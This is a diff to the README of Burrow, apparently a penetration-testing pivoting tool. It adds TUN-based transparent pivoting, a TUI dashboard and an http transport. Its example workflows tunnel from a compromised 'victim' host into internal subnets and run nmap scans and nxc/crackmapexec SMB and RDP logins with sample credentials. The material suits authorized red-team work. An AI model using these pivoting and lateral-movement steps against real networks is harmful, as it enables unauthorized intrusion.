@@ -10,7 +10,7 @@ Non-root mode routes sessions through SOCKS5. Root mode uses a TUN interface bac
 
 All traffic is encrypted: X25519 key exchange, HKDF-SHA256 key derivation, ChaCha20-Poly1305 or AES-256-GCM AEAD per frame. Agent connections use TLS with certificate fingerprint verification so agents can confirm they're talking to the right server without a CA chain.
 
-A WebUI dashboard is available for session management via browser or REST API. A Python companion package provides MCP server integration and a FastAPI web dashboard.
+A WebUI dashboard and interactive TUI are available for session management. The REST API is exclusively for MCP server integration. A Python companion package provides the MCP server module.
 
 ## Install / Build
 
@@ -62,10 +62,11 @@ On startup, the server generates a self-signed Ed25519 TLS certificate and print
 | `--cert` | | Path to TLS certificate PEM file (overrides auto-generated cert) |
 | `--key` | | Path to TLS private key PEM file |
 | `--no-tls` | | Disable TLS (plaintext connections) |
-| `--transport, -t` | `raw` | Transport protocol: `raw`, `ws`, `dns`, `icmp` |
-| `--mcp-api` | | Enable agent REST API for MCP server integration |
-| `--api-token` | | Token for API authentication (auto-generated if empty) |
-| `--webui` | `127.0.0.1:9090` | Enable WebUI dashboard and optionally set listen address |
+| `--transport, -t` | `raw` | Transport protocol: `raw`, `ws`, `dns`, `icmp`, `http` |
+| `--mcp-api` | | Enable REST API for MCP server integration |
+| `--api-token` | | Token for API authentication (auto-generated if empty, only used with --mcp-api) |
+| `--webui` | `0.0.0.0:9090` | Enable WebUI dashboard and optionally set listen address |
+| `--tui` | | Launch interactive TUI dashboard (requires --mcp-api or --webui for session data) |
 
 **Examples:**
 
@@ -90,6 +91,9 @@ burrow server --cert /path/to/cert.pem --key /path/to/key.pem
 
 # WebUI on custom address
 burrow server --mcp-api --webui 0.0.0.0:9090
+
+# Interactive TUI dashboard
+burrow server --tui --webui
 ```
 
 **Expected output:**
@@ -116,7 +120,7 @@ The agent auto-reconnects on disconnect. Use `--retry` to cap reconnection attem
 | `--connect, -c` | (required) | Server address to connect to (`host:port`) |
 | `--fingerprint` | | Expected server TLS fingerprint (SHA256). Format: `SHA256:hex...` |
 | `--retry` | `0` | Max reconnection attempts. `0` means infinite. |
-| `--transport, -t` | `raw` | Transport protocol: `raw`, `ws`, `dns`, `icmp` |
+| `--transport, -t` | `raw` | Transport protocol: `raw`, `ws`, `dns`, `icmp`, `http` |
 | `--no-tls` | | Connect without TLS |
 
 **Examples:**
@@ -156,7 +160,7 @@ On disconnect, the agent sleeps and retries. With `--retry 0`, it retries indefi
 
 ### `burrow session list`
 
-List all active agent sessions. Queries the WebUI REST API at `/api/sessions`. The server must be running with `--webui`.
+List all active agent sessions. Queries the REST API. The server must be running with `--mcp-api` or `--webui` enabled.
 
 **Flags:**
 
@@ -254,6 +258,8 @@ burrow session use session-abc123 --token <api-token>
 | `tunnel rm <tunnel-id>` | Remove a tunnel |
 | `route add <cidr>` | Add a network route |
 | `route rm <cidr>` | Remove a network route |
+| `tun start` | Start TUN interface for transparent pivoting (root required) |
+| `tun stop` | Stop TUN interface |
 | `help` | Show available commands |
 | `exit` | Exit the REPL |
 
@@ -292,6 +298,97 @@ burrow> exit
 ```
 
 ---
+
+## TUN Transparent Pivoting (Root Required)
+
+TUN mode creates a virtual network interface on the operator's machine, enabling transparent IP-level routing to the agent's network. Unlike SOCKS5 proxying, TUN mode works with ANY protocol (TCP, UDP, ICMP) and requires no proxy configuration on tools -- traffic routes transparently through the kernel's routing table.
+
+TUN mode uses gvisor's userspace TCP/IP stack on the agent side, so the agent does NOT need root privileges. Only the operator (server) needs root to create the TUN interface.
+
+### How It Works
+
+1. The operator starts TUN on a session -- this creates a `tun0` interface with a magic IP (`240.0.0.1`)
+2. The operator adds routes for target subnets (e.g., `10.10.10.0/24`) pointing through the TUN interface
+3. IP packets matching those routes flow through TUN -> yamux stream -> agent's netstack -> real target
+4. Responses flow back the same path transparently
+
+### Why Routes Are Manual
+
+Routes must be added manually because the server cannot reliably determine which subnets are C2 infrastructure vs. target networks. Adding the wrong route (e.g., the C2 subnet) would create a routing loop that kills the agent connection. This is the same approach used by ligolo-ng and other professional pivoting tools.
+
+### TUN Workflow -- TUI
+
+```bash
+# Start server with TUI as root
+sudo burrow server --tui --webui
+```
+
+1. In the session list, press `t` to toggle TUN ON for the selected agent
+2. Press `Enter` to enter the session detail view
+3. Press `r` to open the Add Route form
+4. Enter the target subnet CIDR (e.g., `10.10.10.0/24`) and press `Enter`
+5. Traffic to that subnet now flows transparently through the agent
+
+### TUN Workflow -- CLI
+
+```bash
+# Start server as root
+sudo burrow server
+
+# In another terminal, enter the session
+burrow session use <session-id>
+
+# Start TUN interface
+burrow> tun start
+[+] TUN started
+
+# Add route for target network
+burrow> route add 10.10.10.0/24
+[+] Route added: 10.10.10.0/24
+
+# Now use ANY tool -- traffic routes transparently
+# No proxy configuration needed!
+nmap -sT -Pn 10.10.10.0/24
+nxc smb 10.10.10.25 -u admin -p 'Password1!'
+curl http://10.10.10.15/
+ssh user@10.10.10.25
+
+# When done
+burrow> tun stop
+[+] TUN stopped
+```
+
+### TUN Workflow -- Real-World Example
+
+Scenario: You have SSH access to a dual-homed victim (10.10.155.5 on eth0, 10.10.10.5 on eth1). You want to reach the internal 10.10.10.0/24 network.
+
+```bash
+# 1. Start Burrow server (operator, as root)
+sudo burrow server --tui --webui
+
+# 2. SSH reverse tunnel to forward agent traffic
+ssh -R 11601:127.0.0.1:11601 user@10.10.155.5
+
+# 3. Run agent on victim (through the SSH tunnel)
+./burrow agent --connect 127.0.0.1:11601
+
+# 4. In TUI: press 't' to enable TUN on the new session
+# 5. Press Enter, then 'r', add route: 10.10.10.0/24
+
+# 6. Tools now work directly against the internal network:
+nxc smb 10.10.10.25 -u ferrucio -p 'Winter2023!' --users
+crackmapexec rdp 10.10.10.0/24
+```
+
+### Common Mistakes
+
+| Mistake | Result | Fix |
+|---------|--------|-----|
+| Routing the C2 subnet through TUN | Agent connection dies (routing loop) | Only route TARGET subnets, never the C2 path |
+| Forgetting `sudo` | TUN creation fails (permission denied) | Run `burrow server` as root |
+| Adding overlapping routes | Traffic may not flow as expected | Use specific CIDRs, avoid /8 or /0 |
+| Agent dies, routes remain | Traffic blackholed | Remove stale routes with `route rm` or `ip route del` |
+
 
 ### `burrow proxy socks5`
 
@@ -821,22 +918,18 @@ burrow relay tcp-listen:9001 tcp-connect:127.0.0.1:9000
 ### Agent-Based Tunneling
 
 ```bash
-# Operator: start server with WebUI
-burrow server --webui
-# Note the fingerprint and API token printed on startup
+# Operator: start server with TUI (as root for TUN support)
+sudo burrow server --tui --webui
 
 # Target: run agent
 burrow agent --connect OPERATOR_IP:11601 --fingerprint SHA256:a3f2c1...
 
-# Operator: list sessions (use the token from server output)
-burrow session list --token <api-token>
-
-# Operator: manage session interactively
-burrow session use SESSION_ID --token <api-token>
-
+# In TUI: manage sessions, tunnels, routes, and TUN
+# Or use CLI:
+burrow session use SESSION_ID
 burrow> tunnel add local 127.0.0.1:8080 10.0.0.5:80
+burrow> tun start
 burrow> route add 10.0.0.0/24
-burrow> tunnels
 burrow> exit
 ```
 
@@ -983,8 +1076,10 @@ The `session` CLI commands (`list`, `info`, `use`) default to HTTPS and require 
 
 ### REST API
 
+> **Note:** The REST API is designed exclusively for MCP (Model Context Protocol) server integration. It is NOT intended for general use. Use the CLI (`session use`) or TUI (`--tui`) for interactive session management.
+
 **Authentication:** 
-The REST API enforces HTTP Bearer token authentication. Requests must include the automatically generated token (or the token explicitly passed via `--api-token`) in the headers:
+The REST API is only enabled when --mcp-api is passed. It enforces HTTP Bearer token authentication. Requests must include the automatically generated token (or the token explicitly passed via `--api-token`) in the headers:
 `Authorization: Bearer <token>`
 
 All endpoints return JSON.
@@ -1000,6 +1095,8 @@ All endpoints return JSON.
 | `POST` | `/api/sessions/{id}/routes` | Add route |
 | `DELETE` | `/api/sessions/{id}/routes/{cidr}` | Remove route |
 | `GET` | `/api/events` | SSE event stream for live updates |
+| `POST` | `/api/sessions/{id}/tun` | Start TUN interface |
+| `DELETE` | `/api/sessions/{id}/tun` | Stop TUN interface |
 
 **Create tunnel (POST body):**
 
@@ -1085,7 +1182,7 @@ Dependencies: click, rich, pyyaml, pydantic, cryptography, fastapi, uvicorn.
 ## Architecture
 
 ```
-cmd/burrow/cmd/          CLI (cobra)
+cmd/burrow/cmd/          CLI (cobra) + TUI (bubbletea)
 internal/
   transport/             Transport interface + registry (raw, ws, dns, icmp, http)
   crypto/                X25519 ECDH + ChaCha20-Poly1305/AES-256-GCM
@@ -1108,39 +1205,56 @@ internal/
 
 ---
 
-### `burrow tui`
+### TUI Dashboard (`--tui` flag)
 
-Interactive terminal UI dashboard built with bubbletea. Provides a full-screen interface for managing sessions, tunnels, and routes without needing to remember CLI flags or API endpoints.
+Interactive terminal UI dashboard built with bubbletea. Provides a full-screen interface for managing sessions, tunnels, routes, and TUN interfaces without needing to remember CLI flags or API endpoints.
 
-Requires a running Burrow server with `--webui` enabled.
+Enabled by passing `--tui` to `burrow server`. When combined with `--webui`, the TUI header displays a clickable link to the WebUI.
 
-**Flags:**
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--api-url` | `https://127.0.0.1:9090` | WebUI API base URL |
-| `--token` | | API authentication token |
-
-**Examples:**
+**Example:**
 
 ```bash
-# Launch TUI with defaults
-burrow tui --token <api-token>
+# Start server with TUI dashboard
+burrow server --tui
 
-# Connect to remote server
-burrow tui --api-url https://10.0.0.1:9090 --token <api-token>
+# TUI with WebUI (TUI header shows WebUI link)
+burrow server --tui --webui
+
+# TUI with all features
+burrow server --tui --webui --mcp-api
 ```
 
-**Views:**
+**Keybindings -- Session List:**
 
-| View | Description | Key Bindings |
-|------|-------------|-------------|
-| Sessions List | Browse all active agent sessions with hostname, OS, IPs, and creation time | `↑/↓` navigate, `Enter` view details, `a` add tunnel, `r` add route, `q` quit |
-| Session Detail | Detailed view of a session including active tunnels and routes | `Esc` back to list |
-| Add Tunnel | Form to create a new tunnel (direction, listen address, remote address, protocol) | `Tab` next field, `Enter` submit, `Esc` cancel |
-| Add Route | Form to add a network route (CIDR notation) | `Tab` next field, `Enter` submit, `Esc` cancel |
+| Key | Action |
+|-----|--------|
+| `↑` / `k` | Move cursor up |
+| `↓` / `j` | Move cursor down |
+| `Enter` | Enter session detail view |
+| `t` / `T` | Toggle TUN on/off for selected session |
+| `q` | Quit |
 
-**Dependencies:** bubbletea v1.3.10, lipgloss v1.1.0, bubbles v1.0.0
+**Keybindings -- Session Detail:**
+
+| Key | Action |
+|-----|--------|
+| `q` / `Esc` | Back to session list |
+| `Tab` | Switch between Tunnels and Routes tabs |
+| `↑` / `k` | Move cursor up |
+| `↓` / `j` | Move cursor down |
+| `t` | Open add tunnel form |
+| `r` | Open add route form |
+| `T` (Shift) | Toggle TUN on/off |
+| `d` / `Delete` | Delete selected tunnel or route |
+
+**Keybindings -- Forms (Add Tunnel / Add Route):**
+
+| Key | Action |
+|-----|--------|
+| `Tab` / `↓` | Next field |
+| `Shift+Tab` / `↑` | Previous field |
+| `Enter` | Submit |
+| `Esc` | Cancel |
 
 ---
 
